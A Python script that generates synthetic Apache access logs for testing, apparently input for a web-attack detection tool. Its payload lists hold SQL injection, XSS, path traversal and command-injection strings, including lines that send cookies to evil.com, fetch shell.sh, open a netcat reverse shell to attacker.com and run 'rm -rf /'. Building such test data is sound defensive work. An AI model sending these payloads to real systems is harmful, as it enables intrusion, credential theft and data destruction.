"""
生成各种类型的测试日志文件
包括：正常访问、SQL注入、XSS攻击、目录遍历、命令注入、扫描行为等
"""
import random
from datetime import datetime, timedelta

# 配置
OUTPUT_DIR = "data"

# IP 地址池
normal_ips = [f"192.168.1.{i}" for i in range(100, 150)]
attacker_ips = [f"203.0.113.{i}" for i in range(40, 60)]
scanner_ips = [f"172.16.0.{i}" for i in range(10, 30)]
bot_ips = [f"10.0.0.{i}" for i in range(50, 70)]

# 正常 URL
normal_urls = [
    "/index.html", "/about.html", "/contact", "/products", "/services",
    "/blog", "/news", "/faq", "/help", "/support",
    "/css/style.css", "/js/app.js", "/images/logo.png", "/favicon.ico",
    "/api/users", "/api/products", "/api/orders", "/api/settings",
    "/docs/api", "/terms", "/privacy", "/careers", "/events",
    "/gallery", "/downloads", "/resources", "/press", "/partners"
]

# SQL 注入攻击
sqli_attacks = [
    "/api/users?id=1 OR 1=1--",
    "/search?q=' UNION SELECT username,password FROM users--",
    "/login?user=admin'--",
    "/items?id=1; DROP TABLE users;--",
    "/products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "/api/data?filter=' OR '1'='1",
    "/users?sort=name; EXEC xp_cmdshell('dir')--",
    "/search?q='; INSERT INTO admin VALUES('hacker','pass')--",
    "/api/query?sql=SELECT * FROM users WHERE id=1 OR 1=1",
    "/products?id=1 UNION ALL SELECT NULL,NULL,NULL--",
    "/api/login?username=admin'/*&password=*/OR/*1=1--",
    "/search?keyword=' UNION SELECT credit_card,cvv FROM payments--",
    "/api/items?category=electronics'; WAITFOR DELAY '0:0:5'--",
]

# XSS 攻击
xss_attacks = [
    "/comment?text=<script>alert('XSS')</script>",
    "/search?q=<img src=x onerror=alert(document.cookie)>",
    "/profile?name=<svg onload=alert('XSS')>",
    "/feedback?msg=<body onload=alert('XSS')>",
    "/api/comment?content=<iframe src='javascript:alert(1)'>",
    "/search?q=\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "/profile?bio=<div onclick=alert('XSS')>Click me</div>",
    "/api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script>",
    "/comment?body=<marquee onstart=alert('XSS')>",
    "/search?q=<input onfocus=alert('XSS') autofocus>",
]

# 目录遍历攻击
path_traversal_attacks = [
    "/files?path=../../../etc/passwd",
    "/download?file=....//....//....//etc/shadow",
    "/static/..%2f..%2f..%2fetc%2fpasswd",
    "/include?page=....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
    "/files?name=../../../var/log/auth.log",
    "/download?doc=..\\..\\..\\boot.ini",
    "/view?template=../../../../etc/nginx/nginx.conf",
    "/api/file?path=/etc/passwd%00.jpg",
    "/load?module=../../../proc/self/environ",
    "/read?file=....//....//....//etc/hosts",
]

# 命令注入攻击
command_injection_attacks = [
    "/api/ping?host=127.0.0.1;cat /etc/passwd",
    "/lookup?domain=example.com|whoami",
    "/api/exec?cmd=test`id`",
    "/ping?ip=8.8.8.8&&net user",
    "/api/dns?query=google.com$(cat /etc/shadow)",
    "/tools/traceroute?target=example.com||ls -la",
    "/api/check?url=http://test.com;rm -rf /",
    "/lookup?host=localhost;wget http://evil.com/shell.sh",
    "/api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash",
    "/ping?addr=8.8.4.4&echo hacked > /tmp/pwned",
]

# 扫描器行为（大量不同URL）
scanner_urls = [
    "/admin", "/administrator", "/wp-admin", "/wp-login.php",
    "/phpmyadmin", "/mysql", "/db", "/database",
    "/.env", "/config.yml", "/settings.json", "/.git/config",
    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config",
    "/server-status", "/server-info", "/info.php", "/phpinfo.php",
    "/test", "/debug", "/console", "/manager",
    "/.svn/entries", "/.DS_Store", "/Thumbs.db",
    "/api/v1/users", "/api/v2/admin", "/graphql", "/swagger.json",
]

# User-Agent 列表
normal_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

attack_agents = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "DirBuster-1.0-RC1 (http://www.owasp.org/)",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Wget/1.21.3",
]


def generate_timestamp(base_time, offset_seconds):
    """生成 Apache 格式的时间戳"""
    dt = base_time + timedelta(seconds=offset_seconds)
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0800")


def generate_normal_logs(count=200):
    """生成正常访问日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    
    for i in range(count):
        ip = random.choice(normal_ips)
        timestamp = generate_timestamp(base_time, random.randint(0, 86400))
        method = random.choice(["GET"] * 9 + ["POST"])
        url = random.choice(normal_urls)
        status = random.choice([200] * 85 + [301, 304, 404])
        size = random.randint(200, 50000)
        agent = random.choice(normal_agents)
        
        log = f'{ip} - - [{timestamp}] "{method} {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 86400)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_sqli_logs(count=50):
    """生成 SQL 注入攻击日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=20)
    
    for i in range(count):
        ip = random.choice(attacker_ips[:5])
        timestamp = generate_timestamp(base_time, random.randint(0, 7200))
        url = random.choice(sqli_attacks)
        status = random.choice([200, 403, 500])
        size = random.randint(100, 5000)
        agent = random.choice(attack_agents[:2])
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 7200)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_xss_logs(count=50):
    """生成 XSS 攻击日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=18)
    
    for i in range(count):
        ip = random.choice(attacker_ips[5:10])
        timestamp = generate_timestamp(base_time, random.randint(0, 5400))
        url = random.choice(xss_attacks)
        status = random.choice([200, 400, 403])
        size = random.randint(100, 3000)
        agent = random.choice(attack_agents)
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 5400)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_path_traversal_logs(count=40):
    """生成目录遍历攻击日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=16)
    
    for i in range(count):
        ip = random.choice(attacker_ips[10:15])
        timestamp = generate_timestamp(base_time, random.randint(0, 3600))
        url = random.choice(path_traversal_attacks)
        status = random.choice([400, 403, 404])
        size = random.randint(100, 1000)
        agent = random.choice(attack_agents)
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 3600)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_command_injection_logs(count=30):
    """生成命令注入攻击日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=14)
    
    for i in range(count):
        ip = random.choice(attacker_ips[15:])
        timestamp = generate_timestamp(base_time, random.randint(0, 2700))
        url = random.choice(command_injection_attacks)
        status = random.choice([400, 403, 500])
        size = random.randint(100, 2000)
        agent = random.choice(attack_agents)
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 2700)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_scanner_logs(count=150):
    """生成扫描器行为日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=12)
    
    for i in range(count):
        ip = random.choice(scanner_ips)
        timestamp = generate_timestamp(base_time, random.randint(0, 1800))
        url = random.choice(scanner_urls)
        status = random.choice([200, 301, 403, 404] * 10 + [500])
        size = random.randint(0, 5000)
        agent = random.choice(attack_agents[1:])
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 1800)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_bot_logs(count=100):
    """生成爬虫/Bot 日志"""
    logs = []
    base_time = datetime.now() - timedelta(hours=10)
    
    bot_agents = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
        "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
    ]
    
    for i in range(count):
        ip = random.choice(bot_ips)
        timestamp = generate_timestamp(base_time, random.randint(0, 86400))
        url = random.choice(normal_urls + ["/robots.txt", "/sitemap.xml"])
        status = random.choice([200] * 90 + [304, 404])
        size = random.randint(500, 30000)
        agent = random.choice(bot_agents)
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 86400)), log))
    
    return sorted(logs, key=lambda x: x[0])


def generate_mixed_attack_logs(count=80):
    """生成混合攻击日志（多种攻击类型组合）"""
    logs = []
    base_time = datetime.now() - timedelta(hours=8)
    
    all_attacks = sqli_attacks + xss_attacks + path_traversal_attacks + command_injection_attacks
    
    for i in range(count):
        ip = random.choice(attacker_ips + scanner_ips)
        timestamp = generate_timestamp(base_time, random.randint(0, 3600))
        url = random.choice(all_attacks)
        status = random.choice([200, 400, 403, 500])
        size = random.randint(100, 5000)
        agent = random.choice(attack_agents)
        
        log = f'{ip} - - [{timestamp}] "GET {url} HTTP/1.1" {status} {size} "-" "{agent}"'
        logs.append((base_time + timedelta(seconds=random.randint(0, 3600)), log))
    
    return sorted(logs, key=lambda x: x[0])


def save_logs(filename, logs_with_time):
    """保存日志到文件"""
    filepath = f"{OUTPUT_DIR}/{filename}"
    with open(filepath, 'w', encoding='utf-8') as f:
        for _, log in logs_with_time:
            f.write(log + '\n')
    print(f"✓ 生成 {filepath} - {len(logs_with_time)} 条日志")


def main():
    """主函数：生成所有类型的测试日志"""
    import os
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    print("="*60)
    print("开始生成测试日志文件...")
    print("="*60)
    
    # 1. 正常访问日志
    normal_logs = generate_normal_logs(200)
    save_logs("normal_access.log", normal_logs)
    
    # 2. SQL 注入攻击日志
    sqli_logs = generate_sqli_logs(50)
    save_logs("sqli_attack.log", sqli_logs)
    
    # 3. XSS 攻击日志
    xss_logs = generate_xss_logs(50)
    save_logs("xss_attack.log", xss_logs)
    
    # 4. 目录遍历攻击日志
    path_logs = generate_path_traversal_logs(40)
    save_logs("path_traversal.log", path_logs)
    
    # 5. 命令注入攻击日志
    cmd_logs = generate_command_injection_logs(30)
    save_logs("command_injection.log", cmd_logs)
    
    # 6. 扫描器行为日志
    scanner_logs = generate_scanner_logs(150)
    save_logs("scanner_activity.log", scanner_logs)
    
    # 7. Bot/爬虫日志
    bot_logs = generate_bot_logs(100)
    save_logs("bot_crawler.log", bot_logs)
    
    # 8. 混合攻击日志
    mixed_logs = generate_mixed_attack_logs(80)
    save_logs("mixed_attacks.log", mixed_logs)
    
    # 9. 综合日志（包含所有类型）
    all_logs = []
    all_logs.extend(normal_logs)
    all_logs.extend(sqli_logs)
    all_logs.extend(xss_logs)
    all_logs.extend(path_logs)
    all_logs.extend(cmd_logs)
    all_logs.extend(scanner_logs)
    all_logs.extend(bot_logs)
    all_logs.extend(mixed_logs)
    
    # 按时间排序
    all_logs_sorted = sorted(all_logs, key=lambda x: x[0])
    save_logs("comprehensive_test.log", all_logs_sorted)
    
    print("\n" + "="*60)
    print("✅ 所有测试日志生成完成！")
    print("="*60)
    print(f"\n📁 文件位置: {os.path.abspath(OUTPUT_DIR)}")
    print(f"\n📊 统计信息:")
    print(f"   - 正常访问: 200 条")
    print(f"   - SQL 注入: 50 条")
    print(f"   - XSS 攻击: 50 条")
    print(f"   - 目录遍历: 40 条")
    print(f"   - 命令注入: 30 条")
    print(f"   - 扫描行为: 150 条")
    print(f"   - Bot/爬虫: 100 条")
    print(f"   - 混合攻击: 80 条")
    print(f"   - 综合测试: {len(all_logs_sorted)} 条")
    print(f"\n💡 提示: 可以逐个上传这些文件进行测试，或直接使用 comprehensive_test.log")


if __name__ == '__main__':
    main()
